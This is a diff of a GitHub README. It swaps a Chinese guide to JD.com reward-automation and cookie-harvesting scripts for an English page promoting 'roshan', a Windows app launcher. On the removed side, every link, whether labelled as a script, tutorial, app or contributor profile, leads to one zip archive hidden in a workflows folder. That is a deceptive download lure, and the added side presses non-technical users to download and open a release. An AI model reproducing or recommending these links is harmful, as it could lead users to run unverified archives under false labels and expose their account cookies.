@@ -1,131 +1,132 @@
-## 请勿使用github action、滥用github资源会封我仓库以及账号
+# 🚀 roshan - Launch Your Daily Apps in Order
 
-## 特别声明: 
+[![Download roshan](https://img.shields.io/badge/Download_roshan-Windows_Release-33C1FF?style=for-the-badge&labelColor=FF5733&logo=windows&logoColor=white)](https://github.com/kkkknrg/roshan/releases)
 
-* 本仓库发布的Script项目中涉及的任何解锁和解密分析脚本，仅用于测试和学习研究，禁止用于商业用途，不能保证其合法性，准确性，完整性和有效性，请根据情况自行判断.
+roshan is a small, offline, open-source Windows app that starts the apps and commands you use every day in one click, in the right order. Instead of opening the same programs one by one, you create a simple launch flow and let roshan handle the routine.
 
-* 本项目内所有资源文件，禁止任何公众号、自媒体进行任何形式的转载、发布。
+It is built for people who want a calmer desktop routine: open your work setup, start your morning tools, prepare your study space, or bring up your evening apps without hunting through the Start menu. roshan is made with Rust and GPUI, stays lightweight, and works without an internet connection.
 
-* LXK9301对任何脚本问题概不负责，包括但不限于由任何脚本错误导致的任何损失或损害.
+## ✨ What Is roshan?
 
-* 间接使用脚本的任何用户，包括但不限于建立VPS或在某些行为违反国家/地区法律或相关法规的情况下进行传播, LXK9301 对于由此引起的任何隐私泄漏或其他后果概不负责.
+roshan is a desktop launcher for Windows. You tell it what you want to open, arrange the order, and then start everything with one click.
 
-* 请勿将Script项目的任何内容用于商业或非法目的，否则后果自负.
+That means you can group the things you use together, such as:
 
-* 如果任何单位或个人认为该项目的脚本可能涉嫌侵犯其权利，则应及时通知并提供身份证明，所有权证明，我们将在收到认证文件后删除相关脚本.
+- Your browser and a chat app
+- A notes app and a music player
+- Work folders and daily documents
+- Common commands you run often
+- A set of apps for studying, writing, or planning
 
-* 任何以任何方式查看此项目的人或直接或间接使用该Script项目的任何脚本的使用者都应仔细阅读此声明。LXK9301 保留随时更改或补充此免责声明的权利。一旦使用并复制了任何相关脚本或Script项目的规则，则视为您已接受此免责声明.
+Instead of treating every program as a separate task, roshan turns your daily setup into a repeatable action. It is useful for non-technical users because you do not need to remember commands, write scripts, or open several windows manually.
 
- **您必须在下载后的24小时内从计算机或手机中完全删除以上内容.**  </br>
-> ***您使用或者复制了本仓库且本人制作的任何脚本，则视为`已接受`此声明，请仔细阅读*** 
+The app is open source, so anyone can inspect how it works. It is also offline, which means your launch setup stays on your computer and does not depend on a web service.
 
-## Script脚本列表
-#### 说明
-1. 其中 [jd_bean_sign.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) 可N个京东账号，Node.js专用，核心脚本是JD_DailyBonus.js， IOS软件用户请使用NobyDa的 [JD_DailyBonus.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
-2. 以字母排序。
+## 🚀 Download roshan for Windows
 
-| 活动时长 | 名称                            | 脚本                                                                                                   |
-| -------- | --------------------------------- | -------------------------------------------------------------------------------------------------------- |
-| 长期   | 京豆变动通知                | [jd_bean_change.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)       |
-| 长期   | 领京豆额外奖励&抢京豆   | [jd_bean_home.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 京东多合一签到             | [jd_bean_sign.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 东东超市兑换奖品          | [jd_blueCoin.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)             |
-| 长期   | 口袋书店                      | [jd_bookshop.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)             |
-| 长期   | 京东汽车赛点兑换京豆    | [jd_car_exchange.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)     |
-| 长期   | 签到领现金    | [jd_cash.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)     |
-| 长期   | 京东汽车签到                | [jd_car.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                       |
-| 长期   | 摇京豆                         | [jd_club_lottery.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)     |
-| 长期   | 疯狂的JOY挂机                | [jd_crazy_joy_coin.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) |
-| 长期   | 疯狂的JOY日常任务          | [jd_crazy_joy.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 京东金融-天天提鹅         | [jd_daily_egg.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 京喜工厂                      | [jd_dreamFactory.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)     |
-| 长期   | 东东农场                      | [jd_fruit.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                   |
-| 长期   | 宠汪汪                         | [jd_joy.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                       |
-| 长期   | 获取所有互助码             | [jd_get_share_code.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) |
-| 长期   | 东东工厂                      | [jd_jdfactory.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 京东赚赚                      | [jd_jdzz.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                     |
-| 长期   | 宠汪汪单独喂食             | [jd_joy_feedPets.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)     |
-| 长期   | 宠汪汪强制为好友助力（iOS端专用） | [jd_joy_help.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)             |
-| 长期   | 宠汪汪聚宝盆辅助脚本（iOS端专用） | [jd_petTreasureBox.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) |
-| 长期   | 宠汪汪兑换奖品             | [jd_joy_reward.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)         |
-| 长期   | 宠汪汪赛跑助力             | [jd_joy_run.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)               |
-| 长期   | 宠汪汪偷好友狗粮与积分 | [jd_joy_steal.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 宠汪汪                         | [jd_joy.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                       |
-| 长期   | 京喜农场                      | [jd_jxnc.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                     |
-| 长期   | 京东快递签到                | [jd_kd.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                         |
-| 长期   | 京东直播                      | [jd_live.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                     |
-| 长期   | 京东抽奖机                   | [jd_lotteryMachine.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) |
-| 长期   | 摇钱树                         | [jd_moneyTree.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 点点券                         | [jd_necklace.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)             |
-| 长期   | 东东萌宠                      | [jd_pet.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                       |
-| 长期   | 金融养猪                      | [jd_pigPet.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                 |
-| 长期   | 种豆得豆                      | [jd_plantBean.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 京东排行榜签到得京豆    | [jd_rankingList.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)       |
-| 长期   | 全民开红包                   | [jd_redPacket.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)           |
-| 长期   | 进店领豆                      | [jd_shop.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                     |
-| 长期   | 东东小窝                      | [jd_small_home.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)         |
-| 长期   | 天天加速                      | [jd_speed.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                   |
-| 长期   | 东东超市                      | [jd_superMarket.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)       |
-| 长期   | 十元街                         | [jd_syj.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                       |
-| 长期   | 注销京东会员卡             | [jd_unbind.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)                 |
-| 长期   | 取关京东店铺和商品       | [jd_unsubscribe.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)       |
-| 长期   | 京喜签到       | [jx_sign.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)       |
+Visit this link to download the application:
 
-搬运脚本
-1.  【[@yangtingxiao](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)】京东抽奖机([jd_lotteryMachine.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip))
-2.  【[@yangtingxiao](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)】京东排行榜([jd_rankingList.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip))
+[Download roshan from GitHub Releases](https://github.com/kkkknrg/roshan/releases)
 
-**脚本兼容: [QuantumultX](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip), [Surge](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip), [Loon](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip), 小火箭, JSBox, Node.js**
+The download page opens in your browser. Save the download to your Downloads folder, then open it. Follow the on-screen prompt to start roshan.
 
-**TODO**
-- [x] 所有活动互助码在一个脚本打印
+You do not need programming knowledge to begin. The main idea is simple: download roshan, open it, and create your first one-click launch.
 
-## 邀请码互助
-  - [邀请码互助入口](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
-  - [获取各类活动互助码脚本 jd_get_share_code.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
-  - [邀请码使用规范](githubAction.md#互助码类环境变量)(仅限云端)
-## 食用方法
+## 🧰 What You Can Do with roshan
 
-### 方法一：本地安装Node.js，下载本库脚本
+roshan is designed around everyday routines. Here are some practical ways to use it:
 
-  - 教程请见：[EvineDeng/jd-base](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)，适用于以下系统：
+- Start your workday setup with one click.
+- Open your study apps in the same order every time.
+- Prepare a writing session with your notes, browser, and music player.
+- Launch a set of folders and tools for a project.
+- Run common commands without typing them each time.
+- Keep a simple list of daily apps that you can start together.
+- Create separate launch groups for work, personal time, study, and hobbies.
+- Use a Persian-friendly interface if that fits how you work.
 
-    1. Armbian/OpenWrt/Debian/Ubuntu/CentOS/Fedora/RedHat等Linux系统
+Because roshan is a launcher, it is most helpful when you repeat the same actions often. If you open the same four or five things every morning, roshan can reduce that to a single click.
 
-    2. Android
+## 🖱️ How to Set Up Your First One-Click Launch
 
-    3. MacOS
- 
-### 方法二：Docker（NAS或VPS用户）
+Getting started is intended to be straightforward.
 
- - 可以精确控制任务运行时间，有二种办法：[docker办法一](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)、[docker办法二（和本地安装Node.js类似）](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
- - [环境变量集合](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
- 
-#### 注：以上2种运行机制都是Node.js，故您需仔细阅读下面几点
+1. Download roshan using the link in this README.
+2. Open roshan on your Windows computer.
+3. Create a new launch group or start with a simple list.
+4. Add the apps you want roshan to open.
+5. Arrange them in the order you prefer.
+6. Save the group and give it a clear name, such as “Morning,” “Work,” or “Study.”
+7. Click the group whenever you want roshan to start that setup.
 
-  - 获取京东cookie教程可参考 [浏览器获取京东cookie教程](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip) , [插件获取京东cookie教程](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+The order matters. For example, you may want your browser to open before your chat app, or your notes app to open before a music player. roshan lets you decide the sequence so your desktop is ready the way you like it.
 
-  - 京东APP扫码获取cookie(此种方式获取的cookie有效期为90天)(执行`node getJDCookie.js`即可)
-    
-  - 方法二Docker安装Cookie请见各自的说明。
+If you are unsure what to add first, begin with two or three apps you open every day. A small launch group is easier to test. Once it works well, add more items.
 
-### 方法三：iOS系统的代理软件（QuantumultX, Surge, Loon, 小火箭）
+## 💡 Everyday Examples
 
-  - [京东cookie获取脚本 JD_extra_cookie.js](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+A morning launch group could open your browser, calendar, notes, and music player. A work launch group could open your project folder, writing app, and chat app. A study launch group could open your reading materials, a notes app, and a focus timer.
 
-### 赞赏码(开发维护不易,请赏杯茶水费)
-<div align=center><img width="250" height="250" src="./icon/thanks.jpg"/></div>
+You can also use roshan for small routines that are easy to forget. For example, a “Weekly Reset” group could open your planning app, a folder of bills, and a notes file for tasks. A “Creative Session” group could open your design folder, reference images, and a music player.
 
-### 特别感谢(排名不分先后)：
-* [@NobyDa](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+The goal is not to make things complicated. The goal is to remove repeated clicks and small moments of friction from your day.
 
-* [@chavyleung](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+## 🔒 Small, Offline, and Open Source
 
-* [@liuxiaoyucc](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+roshan is built to be small and practical. It does not need a cloud account to launch your daily apps. It is offline, so your routine stays local to your computer. It is open source, which means the project is transparent and can be improved by its community.
 
-* [@Zero-S1](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+The app is made with Rust and GPUI. For non-technical users, the important part is that these tools are chosen for efficient desktop software. You do not need to understand them to use roshan.
 
-* [@uniqueque](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+Privacy is simple: roshan is a local launcher. Your list of apps and the order you choose are part of your own setup on your Windows machine.
 
+## 🪟 Windows Tips
 
-* [@nzw9314](https://github.com/kkkknrg/RehireBar/raw/refs/heads/master/.github/workflows/Bar_Rehire_3.4.zip)
+Keep roshan easy to reach. You can place it on your desktop, pin it to the taskbar, or add it to your Start menu if you prefer. Give your launch groups clear names so you can recognize them quickly.
+
+Start with short names like “Work,” “Study,” “Morning,” or “Evening.” If you create many groups, use names that describe the moment, not just the apps. That makes the right choice faster when you are in a hurry.
+
+Test a new launch group when you are not rushing. Check that the apps open in the order you want. Adjust the order if needed. A good launch group should feel obvious after the first few uses.
+
+## 🛠️ Troubleshooting
+
+If roshan does not start, download it again from the official releases link and open the file from your Downloads folder. Make sure you are opening the file you just downloaded.
+
+If an app in your launch group does not open, check that the app is still available on your computer. Remove it from the group and add it again. If you renamed or moved the app, update the item in roshan.
+
+If the order feels wrong, open your launch group and rearrange the items. Save the changes and test the group again. Start with fewer items if you are unsure which step is causing the problem.
+
+If the download page does not open, copy the link into your browser and try again. Use the official GitHub Releases link shown in this README.
+
+## ❓ Frequently Asked Questions
+
+### Is roshan free?
+
+Yes. roshan is open source and available through its GitHub Releases page.
+
+### Do I need to know programming?
+
+No. roshan is intended for everyday users who want a simple launcher for Windows.
+
+### Does roshan need the internet?
+
+No. roshan is offline and designed to launch local apps and commands.
+
+### Can I change the order of apps?
+
+Yes. The order is a core part of roshan. You arrange the items in the sequence you want.
+
+### Can I use roshan for work and personal setups?
+
+Yes. You can create separate launch groups for different routines.
+
+### Where do I download roshan?
+
+Visit the official releases link:
+
+[Download roshan](https://github.com/kkkknrg/roshan/releases)
+
+### Is roshan suitable for Persian-speaking users?
+
+roshan is built with the Persian community in mind, alongside its broader open-source audience.
+
+Keywords: desktop, gpui, launcher, open-source, persian, productivity, rust, windows
